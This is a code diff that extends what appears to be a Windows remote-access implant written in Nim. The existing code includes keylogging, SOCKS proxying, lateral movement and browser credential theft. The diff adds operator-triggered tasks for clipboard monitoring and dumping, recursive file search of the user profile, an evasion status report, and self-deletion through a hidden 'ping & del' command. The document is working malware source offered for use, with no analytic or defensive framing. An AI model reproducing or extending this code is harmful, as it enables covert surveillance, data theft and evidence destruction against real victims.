@@ -425,6 +425,63 @@ proc keylogThreadProc(p: LPVOID): DWORD {.stdcall.} =
     discard UnhookWindowsHookEx(gKeylogHook); gKeylogHook = 0
   return 0
 
+# ── Clipboard monitor ──────────────────────────────────────────────────────────
+var gClipStop {.volatile.}: bool = true
+var gClipBuf: string = ""
+var gClipInterval: int = 5
+var gClipThread: HANDLE = 0
+
+proc clipMonThreadProc(p: LPVOID): DWORD {.stdcall.} =
+  gClipStop = false
+  var last = ""
+  while not gClipStop:
+    if OpenClipboard(0).bool:
+      let hData = GetClipboardData(UINT(CF_TEXT))
+      if hData != 0:
+        let p2 = GlobalLock(hData)
+        if p2 != nil:
+          let text = $cast[cstring](p2)
+          if text != last:
+            gClipBuf.add("[clip] " & text[0..min(399, text.len-1)] & "\n")
+            last = text
+          discard GlobalUnlock(hData)
+      discard CloseClipboard()
+    for _ in 0..<gClipInterval * 10:
+      if gClipStop: break
+      Sleep(DWORD(100))
+  gClipStop = true
+  return 0
+
+# ── File search ─────────────────────────────────────────────────────────────────
+proc searchDir(dir, pattern: string; results: var seq[string]; limit: int) =
+  if results.len >= limit: return
+  let findPath = dir & "\\*"
+  var fd: WIN32_FIND_DATAW
+  let h = FindFirstFileW(newWideCString(findPath), addr fd)
+  if h == INVALID_HANDLE_VALUE: return
+  defer: discard FindClose(h)
+  while true:
+    let name = $cast[WideCString](addr fd.cFileName[0])
+    if name != "." and name != "..":
+      let full = dir & "\\" & name
+      if (fd.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY) != 0:
+        searchDir(full, pattern, results, limit)
+      else:
+        # glob match via PathMatchSpecW if available, else contains check
+        var matched = false
+        let hShl = LoadLibraryA("shlwapi.dll")
+        if hShl != 0:
+          type PMS = proc(pszFile, pszSpec: LPWSTR): WINBOOL {.stdcall.}
+          let fn = cast[PMS](GetProcAddress(hShl, "PathMatchSpecW"))
+          if fn != nil:
+            matched = fn(newWideCString(name), newWideCString(pattern)).bool
+          discard FreeLibrary(hShl)
+        if not matched:
+          matched = name.toLowerAscii.contains(pattern.strip(chars={'*','?'}).toLowerAscii)
+        if matched and results.len < limit:
+          results.add(full)
+    if FindNextFileW(h, addr fd) == 0: break
+
 # ── SOCKS5 ─────────────────────────────────────────────────────────────────────
 var gSocksStop {.volatile.}: bool = true
 var gSocksSocket: SOCKET = INVALID_SOCKET
@@ -1256,5 +1313,63 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
     except: t.sendResult(id, "", "lateral: " & getCurrentExceptionMsg())
   of "BROWSER_CREDS":
     t.sendResult(id, doBrowserCreds(), "")
+  of "CLIP_MONITOR_START":
+    if not gClipStop:
+      t.sendResult(id, "", "clipboard monitor already running")
+    else:
+      gClipBuf = ""
+      gClipInterval = max(1, try: parseInt(args.strip()) except: 5)
+      gClipThread = CreateThread(nil, 0, clipMonThreadProc, nil, 0, nil)
+      t.sendResult(id, if gClipThread != 0: "[+] clipboard monitor started" else: "", "")
+  of "CLIP_MONITOR_DUMP":
+    let out2 = if gClipBuf.len > 0: gClipBuf else: "[no clipboard data]"
+    gClipBuf = ""
+    t.sendResult(id, out2, "")
+  of "CLIP_MONITOR_STOP":
+    gClipStop = true
+    if gClipThread != 0:
+      discard WaitForSingleObject(gClipThread, DWORD(3000))
+      discard CloseHandle(gClipThread); gClipThread = 0
+    t.sendResult(id, "[+] clipboard monitor stopped", "")
+  of "SEARCH":
+    var parts = args.strip().split(' ')
+    var root = ""
+    var pat = ""
+    if parts.len >= 2:
+      root = parts[0]; pat = parts[1..^1].join(" ")
+    elif parts.len == 1:
+      pat = parts[0]
+    if pat == "":
+      t.sendResult(id, "", "usage: search [root] <pattern>")
+    else:
+      if root == "":
+        root = getEnv("USERPROFILE")
+        if root == "": root = "C:\\"
+      var results: seq[string] = @[]
+      searchDir(root, pat, results, 2000)
+      if results.len == 0:
+        t.sendResult(id, "no files found", "")
+      else:
+        var sb = "[" & $results.len & " files]\n" & results.join("\n")
+        t.sendResult(id, sb, "")
+  of "EVASION_STATUS":
+    let status = "sleep_sec=" & $sleepSecDyn & " jitter_pct=" & $jitterDyn &
+      " keylog=" & (if not gKeylogStop: "on" else: "off") &
+      " screenwatch=" & (if not gSwStop: "on" else: "off") &
+      " socks=" & (if not gSocksStop: "on" else: "off") &
+      " clip_monitor=" & (if not gClipStop: "on" else: "off")
+    t.sendResult(id, status, "")
+  of "CLEANUP":
+    var selfPath = newString(MAX_PATH)
+    let n = GetModuleFileNameW(0, newWideCString(selfPath), DWORD(MAX_PATH))
+    selfPath.setLen(n.int)
+    let cmd = "cmd /c ping -n 3 127.0.0.1 > nul & del /f /q \"" & selfPath & "\""
+    var si: STARTUPINFOW; var pi: PROCESS_INFORMATION
+    zeroMem(addr si, sizeof(si)); si.cb = DWORD(sizeof(si))
+    discard CreateProcessW(nil, newWideCString(cmd), nil, nil, 0,
+      DWORD(CREATE_NO_WINDOW or DETACHED_PROCESS), nil, nil, addr si, addr pi)
+    if pi.hProcess != 0: discard CloseHandle(pi.hProcess); discard CloseHandle(pi.hThread)
+    t.sendResult(id, "[+] scheduled self-delete; exiting", "")
+    quit(0)
   else:
     t.sendResult(id, "", "unknown task type: " & typ)
